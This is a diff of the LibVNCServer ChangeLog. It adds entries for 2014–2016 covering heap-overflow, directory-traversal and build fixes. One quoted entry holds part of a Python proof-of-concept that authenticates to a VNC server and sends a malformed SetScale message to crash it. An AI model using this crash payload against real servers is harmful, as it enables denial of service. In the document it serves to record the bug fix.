@@ -1,3 +1,448 @@
+2016-12-29  Christian Beier <dontmind@freeshell.org>
+
+	* README: Fix README markdown.
+
+2016-12-28  Christian Beier <dontmind@freeshell.org>
+
+	* CMakeLists.txt: CMake: version up as well.
+
+2016-12-28  Christian Beier <dontmind@freeshell.org>
+
+	* NEWS: Update NEWS.
+
+2016-12-28  Christian Beier <dontmind@freeshell.org>
+
+	* configure.ac: Version up.
+
+2016-12-28  Christian Beier <dontmind@freeshell.org>
+
+	* libvncserver/main.c: LibVNCServer: fix starting of an
+	onHold-client in threaded mode.  Discovered by madscientist159 on 11 Jan 2015: "noted in testing with the threaded server build, whereby if
+	newClientHook() returned RFB_CLIENT_ON_HOLD there was no way to
+	release the hold when the server became ready"
+
+2016-12-09  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #145 from bkylerussell/websockets Sec-WebSocket-Protocol header fix
+
+2016-12-02  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #142 from samhed/master Write the correct length for end of header
+
+2016-11-29  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #140 from vapier/master test/Makefile: use check_PROGRAMS
+
+2015-01-10  Timothy Pearson <kb9vqf@pearsoncomputing.net>
+
+	* README: Update README to reflect change from defaultPtrAddEvent to
+	rfbDefaultPtrAddEvent
+
+2016-11-25  Christian Beier <dontmind@freeshell.org>
+
+	* libvncserver/httpd.c: httpd: rework mime type handling to
+	recognise more types
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* .travis.yml: TravisCI: Another stab at fixing OSX build.  See https://github.com/Tarsnap/spiped/pull/92
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* configure.ac: Revert "Hopefully fix building on OSX." This reverts commit 584b23fdbe12edd81119d57ddd378d10e52cc9e1.
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* configure.ac: Hopefully fix building on OSX.
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* .travis.yml: TravisCI: check on OSX as well, test both gcc and
+	clang.
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* libvncclient/rfbproto.c: Fix building on OSX.
+
+2016-11-24  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #137 from atalax/master Fix two heap buffer overflows
+
+2016-11-18  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #138 from stweil/master Fix some typos
+
+2016-11-18  Stefan Weil <sw@weilnetz.de>
+
+	* README, common/zywrletemplate.c, examples/example.c,
+	examples/zippy.c: Fix some typos (it's / its) Signed-off-by: Stefan Weil <sw@weilnetz.de>
+
+2016-11-14  Josef Gajdusek <atx@atx.name>
+
+	* libvncclient/ultra.c: Fix heap overflow in the ultra.c decoder The Ultra type tile decoder does not use the _safe variant of the
+	LZO decompress function, which allows a maliciuous server to
+	overwrite parts of the heap by sending a larger-than-specified LZO
+	data stream.
+
+2016-11-14  Josef Gajdusek <atx@atx.name>
+
+	* libvncclient/rfbproto.c: Fix heap overflows in the various
+	rectangle fill functions Altough rfbproto.c does check whether the overall FramebufferUpdate
+	rectangle is too large, some of the individual encoding decoders do
+	not, which allows a malicious server to overwrite parts of the heap.
+
+2016-09-24  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #129 from bkylerussell/systemd Support systemd socket activation
+
+2016-08-14  Zac Medico <zmedico@gmail.com>
+
+	* libvncserver/sockets.c: Support autoPort with ipv4 or ipv6
+	disabled Make it possible to get autoPort behavior with either ipv4 or ipv6
+	disabled, by setting rfbScreen->ipv6port or rfbScreen->port to a
+	negative number. This will make it possible for x11vnc to enforce
+	its -noipv6 option, as discussed in the following bug report: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=672449
+
+2016-06-05  Christian Beier <dontmind@freeshell.org>
+
+	* NEWS: Update NEWS.
+
+2016-06-05  Christian Beier <dontmind@freeshell.org>
+
+	* rfb/rfbclient.h: Fix rfbClientSwap64IfLE broken in
+	fe7df89fb1777b4fd303d5a601541f6062caf8ea
+
+2016-06-05  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #84 from plettix/master fix for issue 81
+
+2016-05-30  Christian Beier <cb@shoutrlabs.com>
+
+	* CMakeLists.txt: CMake: Add maybe-found OpenSSL libs to
+	libvncclient.
+
+2016-05-30  Christian Beier <cb@shoutrlabs.com>
+
+	* CMakeLists.txt: CMake: Not all platforms have endian.h, so use the
+	build system's endianess check.
+
+2016-05-30  Christian Beier <cb@shoutrlabs.com>
+
+	* rfb/rfbproto.h: Only include endian.h if present on system.
+
+2016-05-30  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #105 from cgeorges82/master fix for issue #97. Also, this fixes cmake builds for other
+	platforms.
+
+2016-05-13  George Fleury <gfleury@gmail.com>
+
+	* libvncserver/sockets.c: Avoid calling SSL_pending when connection
+	is already closed Avoid calling SSL_pending when connection is already closed, calling
+	SSL_pending with connection already closed is crashing.  To
+	reproduce, open a secure websocket binay protocol connection with
+	libvncserver compiled with OpenSSL, and when libvncserver is waiting
+	for rfbProcessClientProtocolVersion send any invalid char, it will
+	fail and call rfbCloseClient whith destroy all SSL context, calling
+	SSL_pending after that will generate a invalid access.
+
+2016-04-24  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #103 from rdieter/master use namespaced vnc_max macro (issue #102)
+
+2016-04-23  gbdj <gbdj@users.noreply.github.com>
+
+	* libvncclient/tls_gnutls.c, libvncclient/vncviewer.c,
+	rfb/rfbclient.h: libvncclient/tls_gnutls.c: Add hooks to
+	WriteToTLS() for optional protection by mutex. Fix upstream issue
+	#100 Squashed commit of the pull request #101 : commit
+	1c7e01e81862bc46508e675e83c74cc6d63224b0 commit
+	1e749b094d6696380d3f0540a00138d7e3427874
+
+2016-02-18  Rex Dieter <rdieter@math.unl.edu>
+
+	* libvncclient/listen.c, libvncserver/httpd.c,
+	libvncserver/rfbserver.c, libvncserver/sockets.c, rfb/rfbproto.h: 
+	use namespaced rfbMax macro (issue #102) Not using generic 'max', avoids conflicts with stl_algobase.h
+
+2016-04-15  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #115 from solofox/master Enable AF_UNIX socket: ignore setsockopt TCP_NODELAY failure.
+
+2016-04-13  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #114 from zbierak/master Increase MAX_ENCODINGS value to accommodate more client encodings
+
+2016-04-12  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #110 from AlexejStukov/patch-1 break statement out of case
+
+2016-04-12  zbierak <zbierak@users.noreply.github.com>
+
+	* libvncclient/rfbproto.c: Fix buffer overflow when applying client
+	encodings
+
+2016-04-12  Christian Beier <cb@shoutrlabs.com>
+
+	* travis.yml: TravisCI: remove old config.
+
+2016-04-12  Christian Beier <cb@shoutrlabs.com>
+
+	* .travis.yml: TravisCI: add autoreconf step.
+
+2016-04-12  Christian Beier <cb@shoutrlabs.com>
+
+	* .travis.yml: TravisCI: the config starts with a dot!
+
+2016-04-12  Christian Beier <cb@shoutrlabs.com>
+
+	* README, README.md: Add a README.md and and Travis CI status badge.
+
+2016-04-12  Christian Beier <cb@shoutrlabs.com>
+
+	* travis.yml: Add a minimalistic config for Travis CI.
+
+2016-04-08  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #109 from zbierak/master Fix memory access error in camera.c example
+
+2016-04-04  zbierak <zbierak@users.noreply.github.com>
+
+	* examples/camera.c: Fix memory access error in camera.c example
+
+2016-03-05  Cédric Georges <cgeorges@edge-airport.com>
+
+	* CMakeLists.txt, libvncclient/tls_gnutls.c: Append missing include
+	directory for GNUTLS and OPENSSL in CMake project Append support of
+	gnutls > v 2.99.01 (gnutls_transport_set_global_errno have a
+	different signature)
+
+2016-03-05  Cédric Georges <cgeorges@edge-airport.com>
+
+	* CMakeLists.txt: re-up comment
+
+2016-03-05  Cédric Georges <cgeorges@edge-airport.com>
+
+	* CMakeLists.txt, rfb/rfbconfig.h.cmake: Append IPv6 option in CMake
+	Project
+
+2016-01-27  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #99 from spaceone/master Ignore null pointers in FillRectangle() and
+	CopyRectangleFromRectangle()
+
+2016-01-27  SpaceOne <space@wechall.net>
+
+	* libvncclient/rfbproto.c: Ignore null pointers in FillRectangle()
+	and CopyRectangleFromRectangle()
+
+2015-12-03  Christian Beier <cb@shoutrlabs.com>
+
+	* rfb/rfbclient.h: Be a bit clearer with the cursorshape
+	documentation for libvncclient.
+
+2015-12-03  Christian Beier <cb@shoutrlabs.com>
+
+	* libvncclient/cursor.c, rfb/rfbclient.h: Properly document
+	HandleCursorShape and GotCursorShapeProc.
+
+2015-10-10  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #90 from stweil/fix Fix some recently introduced regressions
+
+2015-10-10  Stefan Weil <sw@weilnetz.de>
+
+	* rfb/rfbproto.h: Fix definition of POSIX data types Commit 92f558482d94c5152174a1983a40863bd6b07911 added stdint.h to
+	get the type definitions, but included it after the first use of
+	int8_t in builds for Windows.  Signed-off-by: Stefan Weil <sw@weilnetz.de>
+
+2015-10-10  Stefan Weil <sw@weilnetz.de>
+
+	* rfb/rfbproto.h: Fix endianness detection Commit 97f442ef2aa65ade6bea11e90054c57b90abbaca tried to improve the
+	endianness detection, but introduced a typo and problems for Windows
+	builds (no endian.h, different definition of
+	LIBVNCSERVER_WORDS_BIGENDIAN).  Fix both issues.  Signed-off-by: Stefan Weil <sw@weilnetz.de>
+
+2015-10-09  Stefan Weil <sw@weilnetz.de>
+
+	* ChangeLog, Doxyfile, NEWS, README, client_examples/vnc2mpg.c,
+	common/zywrletemplate.c, examples/camera.c, libvncclient/listen.c,
+	libvncclient/sockets.c, libvncserver/cargs.c, libvncserver/scale.c,
+	libvncserver/sockets.c, libvncserver/tight.c,
+	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
+	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
+	libvncserver/tightvnc-filetransfer/rfbtightproto.h,
+	libvncserver/tightvnc-filetransfer/rfbtightserver.c,
+	libvncserver/ultra.c, libvncserver/zlib.c, rfb/keysym.h, rfb/rfb.h,
+	rfb/rfbproto.h, webclients/java-applet/ssl/README,
+	webclients/java-applet/ssl/proxy.vnc,
+	webclients/java-applet/ssl/ss_vncviewer,
+	webclients/java-applet/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
+	webclients/novnc/include/display.js,
+	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js: Fix
+	some typos (found by codespell) Signed-off-by: Stefan Weil <sw@weilnetz.de>
+
+2015-07-22  plettix <plettix@gmail.com>
+
+	* common/md5.c: another shift fix
+
+2015-07-22  plettix <plettix@gmail.com>
+
+	* rfb/rfb.h, rfb/rfbclient.h: shift fixes - if an integer is a
+	negative number then the return value of "Swap32IfLE" was -1
+
+2015-07-07  plettix <plettix@gmail.com>
+
+	* libvncserver/websockets.c: fix for issue 81 use different buffers
+	for decode and encode
+
+2015-05-28  Christian Beier <dontmind@freeshell.org>
+
+	* CMakeLists.txt, configure.ac, rfb/rfbproto.h: Instead of letting
+	the build system define endianess, rely on endian.h.
+
+2015-05-28  Christian Beier <dontmind@freeshell.org>
+
+	* .gitignore, CMakeLists.txt, Doxyfile, Makefile.am, configure.ac,
+	libvncserver/Makefile.am, m4/ax_create_stdint_h.m4, rfb/rfbproto.h: 
+	Do away with rfbint.h generation and use stdint.h directly instead.
+
+2015-04-17  Christian Beier <dontmind@freeshell.org>
+
+	* libvncclient/rfbproto.c, libvncclient/vncviewer.c: Re-add the
+	useful bits of 9aa9ac59b4cb10bfca93456a3098e348de172d7f.
+
+2015-04-17  Christian Beier <dontmind@freeshell.org>
+
+	* libvncclient/Makefile.am: Revert "Add libvncclient/h264.c to dist
+	tarball." This reverts commit 9aa9ac59b4cb10bfca93456a3098e348de172d7f.
+
+2015-04-17  Christian Beier <dontmind@freeshell.org>
+
+	* client_examples/gtkvncviewer.c, configure.ac,
+	libvncclient/Makefile.am, libvncclient/h264.c,
+	libvncclient/rfbproto.c, libvncclient/vncviewer.c, rfb/rfbproto.h: 
+	Revert "LibVNCClient: Add H.264 encoding for framebuffer updates" This reverts commit d891478ec985660c03f95cffda0e6a1ad4ba350c.  Conflicts: 	configure.ac 	libvncclient/h264.c
+
+2015-04-17  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #70 from maxnet/master httpd: disallow directory traversal
+
+2015-04-17  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #72 from lopago/fix-segfaults prevent segfaults due to uninitialized memory
+
+2015-04-15  Thomas Anderson <tanderson@caltech.edu>
+
+	* configure.ac: configure.ac: Use AC_CHECK_TOOL for cross-compiling
+	support.  When cross-compiling the ar program has the appropriate prefix
+	prepended.  Respect that here and have autotools autodetect the
+	appropriate tool.
+
+2015-04-13  Benjamin Dürholt <b.duerholt@portunity.de>
+
+	* libvncserver/rfbssl_gnutls.c, libvncserver/tight.c: Changed C++
+	style comments to C ones
+
+2015-04-10  Benjamin Dürholt <b.duerholt@portunity.de>
+
+	* libvncserver/rfbssl_gnutls.c, libvncserver/tight.c: prevent
+	segfault
+
+2015-03-29  Floris Bos <bos@je-eigen-domein.nl>
+
+	* libvncserver/httpd.c: httpd: disallow directory traversal Signed-off-by: Floris Bos <bos@je-eigen-domein.nl>
+
+2015-03-27  Jay Carlson <nop@nop.com>
+
+	* libvncclient/rfbproto.c: Avoid divide-by-zero in raw encoding (OSX
+	RealVNC) OS X RealVNC server crashes out Remmina because the server can
+	provoke bytesPerLine to be zero. Assume this is coding for zero
+	lines.  The condition could be checked before the calculation of
+	bytesPerLine.  I don’t understand the preconditions of this code
+	to say one way or the other.
+
+2015-02-09  Peter Spiess-Knafl <psk@autistici.org>
+
+	* libvncclient/Makefile.am, libvncserver/Makefile.am: Set autotools
+	SOVERSION.
+
+2015-02-05  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #63 from LibVNC/sha1rework Replace SHA1 implementation with the one from RFC 6234.
+
+2015-01-27  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #60 from cinemast/master fixing SOVERSION and .so VERSION
+
+2015-01-18  Christian Beier <dontmind@freeshell.org>
+
+	* webclients/index.vnc: Update link to project home page in
+	index.vnc.
+
+2015-01-18  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #57 from maxnet/master Fix handling of multiple VNC commands per websockets frame
+
+2015-01-16  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #56 from maxnet/master Only advertise xvp support when xvpHook is set
+
+2015-01-06  Christian Beier <dontmind@freeshell.org>
+
+	* AUTHORS: Add Floris to AUTHORS.
+
+2015-01-06  Christian Beier <dontmind@freeshell.org>
+
+	* NEWS: Update NEWS.
+
+2015-01-02  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #51 from maxnet/master Initialize libgcrypt before use
+
+2015-01-02  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #50 from maxnet/master tls_openssl.c: define _XOPEN_SOURCE for extra POSIX functionality
+
+2014-12-30  Christian Beier <dontmind@freeshell.org>
+
+	* libvncclient/sockets.c: Fix another MinGW64 build issue.
+	WSAEWOULDBLOCK is not MinGW-specific.
+
+2014-12-30  Christian Beier <dontmind@freeshell.org>
+
+	* libvncserver/rfbserver.c: Fix building with mingw-w64.
+
+2014-12-30  Christian Beier <dontmind@freeshell.org>
+
+	* configure.ac: confgure.ac: Remove MinGW linker flag that's
+	incompatible with mingw-w64.
+
+2014-12-30  Christian Beier <dontmind@freeshell.org>
+
+	* autogen.sh: autogen.sh: pass cmdline params to configure call.
+
+2014-12-29  Christian Beier <dontmind@freeshell.org>
+
+	* : Merge pull request #49 from maxnet/master Fix libva related compile errors
+
+2014-12-29  Floris Bos <bos@je-eigen-domein.nl>
+
+	* configure.ac, libvncclient/h264.c: Fix libva related compile
+	errors - Make h264.c compile with recent libva version by including
+	va_compat.h - Only enable libva if libva-x11 is installed - Modified configure help text   Previous help text suggested libva was only build when
+	  --with-libva was specified, while actual behavior is to build it
+	by default.  Warning: THIS CODE IS UNTESTED. Lacking a h.264 capable VNC server
+	Also no attempt is made to support platforms not using X11 Signed-off-by: Floris Bos <bos@je-eigen-domein.nl>
+
+2014-10-31  Christian Beier <dontmind@freeshell.org>
+
+	* README: Add VNCpp to projects using LibVNC.
+
+2014-10-21  Christian Beier <dontmind@freeshell.org>
+
+	* ChangeLog: Update ChangeLog for 0.9.10.
+
 2014-10-21  Christian Beier <dontmind@freeshell.org>
 
 	* NEWS: Update NEWS.
@@ -37,7 +482,7 @@
 
 
 	(struct.pack("BBBBBBBB",PASSWORD_SWAP[0],PASSWORD_SWAP[1],PASSWORD_SWAP[2],PASSWORD_SWAP[3],PASSWORD_SWAP[4],PASSWORD_SWAP[5],PASSWORD_SWAP[6],PASSWORD_SWAP[7]))crypto = DES.new(PASSWORD)         return crypto.encrypt(data)     def reverse_bits(self,x):         a=0         for i in range(8):             a += ((x>>i)&1)<<(7-i)         return a def main(argv):     print "Proof of Concept"     print "Copyright TELUS Security Labs"     print "All Rights Reserved.\n"     try:         HOST = sys.argv[1]         PORT = int(sys.argv[2])     except:         print "Usage: python setscale_segv_poc.py <host> <port>
-	        [password]" sys.exit(1)     try:         PASSWORD = sys.argv[3]     except:         print "No password supplied"         PASSWORD = ""     vnc = RFB()     remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     remote.connect((HOST,PORT))     # Get server version     data = remote.recv(1024)     # Send 3.8 version     remote.send(vnc.INIT_3008)     # Get supported security types     data = remote.recv(1024)     # Process Security Message     secType = vnc.AUTH_PROCESS(data,0)     if secType[0] == "\x02":         # Send accept for password auth         remote.send(vnc.AUTH_PASS)         # Get challenge         data = remote.recv(1024)         # Send challenge response         remote.send(vnc.AUTH_PROCESS_CHALLENGE(data,PASSWORD))     elif secType[0] == "\x01":         # Send accept for None pass         remote.send(vnc.AUTH_NO_PASS)     else:         print 'The server sent us something weird during auth.'         sys.exit(1)     # Get result     data = remote.recv(1024)     # Process result     result = vnc.AUTH_PROCESS(data,1)     if result == "\x01":         # Authentication failure.          data = remote.recv(1024)         print 'Authentication failure. Server Reason: ' + str(data)         sys.exit(1)     elif result == "\x00":         print "Authentication success."     else:         print 'Some other authentication issue occurred.'         sys.exit(1)     # Send ClientInit     remote.send(vnc.SHARE_DESKTOP)     # Send malicious message     print "Sending malicious data..."     remote.send("\x08\x08\x00\x00")     remote.close() if __name__ == "__main__":     main(sys.argv) ---snap---
+	        [password]" sys.exit(1)     try:         PASSWORD = sys.argv[3]     except:         print "No password supplied"         PASSWORD = ""     vnc = RFB()     remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     remote.connect((HOST,PORT))     # Get server version     data = remote.recv(1024)     # Send 3.8 version     remote.send(vnc.INIT_3008)     # Get supported security types     data = remote.recv(1024)     # Process Security Message     secType = vnc.AUTH_PROCESS(data,0)     if secType[0] == "\x02":         # Send accept for password auth         remote.send(vnc.AUTH_PASS)         # Get challenge         data = remote.recv(1024)         # Send challenge response         remote.send(vnc.AUTH_PROCESS_CHALLENGE(data,PASSWORD))     elif secType[0] == "\x01":         # Send accept for None pass         remote.send(vnc.AUTH_NO_PASS)     else:         print 'The server sent us something weird during auth.'         sys.exit(1)     # Get result     data = remote.recv(1024)     # Process result     result = vnc.AUTH_PROCESS(data,1)     if result == "\x01":         # Authentication failure.          data = remote.recv(1024)         print 'Authentication failure. Server Reason: ' + str(data)         sys.exit(1)     elif result == "\x00":         print "Authentication success."     else:         print 'Some other authentication issue occured.'         sys.exit(1)     # Send ClientInit     remote.send(vnc.SHARE_DESKTOP)     # Send malicious message     print "Sending malicious data..."     remote.send("\x08\x08\x00\x00")     remote.close() if __name__ == "__main__":     main(sys.argv) ---snap---
 
 2014-10-14  dscho <johannes.schindelin@gmx.de>
 
@@ -1361,7 +1806,7 @@
 
 	* libvncserver/Makefile.am: Fix build error when libpng is
 	available, but libjpeg is not.  The png stuff in tight.c depends on code in tight.c that uses
-	libjpeg features. We could probably separate that, but for now the
+	libjpeg features. We could probably seperate that, but for now the
 	dependency for 'tight' goes: PNG depends on JPEG depends on ZLIB.  This is reflected in Makefile.am now.  NB: Building tight.c with JPEG but without PNG is still possible,     but nor the other way around.
 
 2011-12-01  Christian Beier <dontmind@freeshell.org>
@@ -1527,10 +1972,10 @@
 2011-10-16  George Fleury <gfleury@gmail.com>
 
 	* libvncserver/rfbserver.c: Fix memory leak I was debbuging some code tonight and i found a pointer that is not
-	been freed, so i think there is maybe a memory leak, so it is...  there is the malloc caller reverse order: ( malloc cl->statEncList ) 	<- rfbStatLookupEncoding 	<- rfbStatRecordEncodingSent 	<- rfbSendCursorPos 	<- rfbSendFramebufferUpdate 	<- rfbProcessEvents I didn't look the whole libvncserver api, but i am using
+	been freed, so i think there is maybe a memory leak, so it is...  there is the malloc caller reverse order: ( malloc cl->statEncList ) 	<- rfbStatLookupEncoding 	<- rfbStatRecordEncodingSent 	<- rfbSendCursorPos 	<- rfbSendFramebufferUpdate 	<- rfbProcessEvents I didnt look the whole libvncserver api, but i am using
 	rfbReverseConnection with rfbProcessEvents, and then when the client
 	connection dies, i am calling a rfbShutdownServer and
-	rfbScreenCleanup, but the malloc at rfbStatLookupEncoding isn't been
+	rfbScreenCleanup, but the malloc at rfbStatLookupEncoding isnt been
 	freed.  So to free the stats i added a rfbResetStats(cl) after
 	rfbPrintStats(cl) at rfbClientConnectionGone in rfbserver.c before
 	free the cl pointer. (at rfbserver.c line 555). And this, obviously,
@@ -1685,7 +2130,7 @@
 2011-08-25  Gernot Tenchio <gernot@tenchio.de>
 
 	* libvncserver/websockets.c: websockets: added gcrypt based sha1
-	digest function
+	digest funtion
 
 2011-08-25  Joel Martin <jmartin@sentryds.com>
 
@@ -1901,7 +2346,7 @@
 
 2010-11-10  George Kiagiadakis <kiagiadakis.george@gmail.com>
 
-	* libvncserver/tight.c: Fix memory corruption bug.  This bug occurred when a second telepathy tubes client was connected
+	* libvncserver/tight.c: Fix memory corruption bug.  This bug occured when a second telepathy tubes client was connected
 	after the first one had disconnected and the channel (thus, the
 	screen too) had been destroyed.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>
 
@@ -2070,7 +2515,7 @@
 	common/minilzo.h, libvncclient/Makefile.am,
 	libvncserver/Makefile.am: Update minilzo library used for Ultra
 	encoding to ver 2.04.  According to the minilzo README, this brings a significant speedup
-	on 64-bit architectures.  Changes compared to old version 1.08 can be found here:
+	on 64-bit architechtures.  Changes compared to old version 1.08 can be found here:
 	http://www.oberhumer.com/opensource/lzo/lzonews.php Signed-off-by: Christian Beier <dontmind@freeshell.org>
 
 2011-01-24  Christian Beier <dontmind@freeshell.org>
@@ -3209,7 +3654,7 @@
 	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
 	x11vnc/user.h, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Allow range
 	for X11VNC_SKIP_DISPLAY, document grab Xserver issue.  Add
-	progress_client() to proceed more quickly through handshake.
+	progress_client() to proceed more quickly thru handshake.
 	Improvements to turbovnc hack.
 
 2009-03-07  dscho <dscho>
@@ -5601,7 +6046,7 @@
 	x11vnc/sslcmds.h, x11vnc/sslhelper.c, x11vnc/sslhelper.h,
 	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
 	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
-	x11vnc/x11vnc_defs.c:  SSL Java viewer work through proxy.  -sslGenCA, etc key/cert
+	x11vnc/x11vnc_defs.c:  SSL Java viewer work thru proxy.  -sslGenCA, etc key/cert
 	 management utils for x11vnc.  FBPM "support".
 
 2006-03-28  dscho <dscho>
@@ -6760,7 +7205,7 @@
 
 	* AUTHORS, libvncclient/listen.c, libvncclient/sockets.c,
 	libvncclient/vncviewer.c: use rfbClientErr to log errors, check if
-	calloc succeeded (both hinted by Andre Leiradella)
+	calloc succeded (both hinted by Andre Leiradella)
 
 2004-11-30  dscho <dscho>
 
@@ -7442,7 +7887,7 @@
 2003-08-03  dscho <dscho>
 
 	* rfb/rfbproto.h: forgot to change WORDS_BIGENDIAN to
-	LIBVNCSERVER_BIGENDIAN; #undef VERSION unnecessary...
+	LIBVNCSERVER_BIGENDIAN; #undef VERSION unneccessary...
 
 2003-08-02  dscho <dscho>
 
@@ -8285,7 +8730,7 @@
 
 2001-10-15  dscho <dscho>
 
-	* .gdb_history: unnecessary file
+	* .gdb_history: unneccessary file
 
 2001-10-13  dscho <dscho>
 
@@ -8536,7 +8981,7 @@
 
 2001-09-25  dscho <dscho>
 
-	* .depend: rmoved unnecessary files
+	* .depend: rmoved unneccessary files
 
 2001-09-25  dscho <dscho>
 
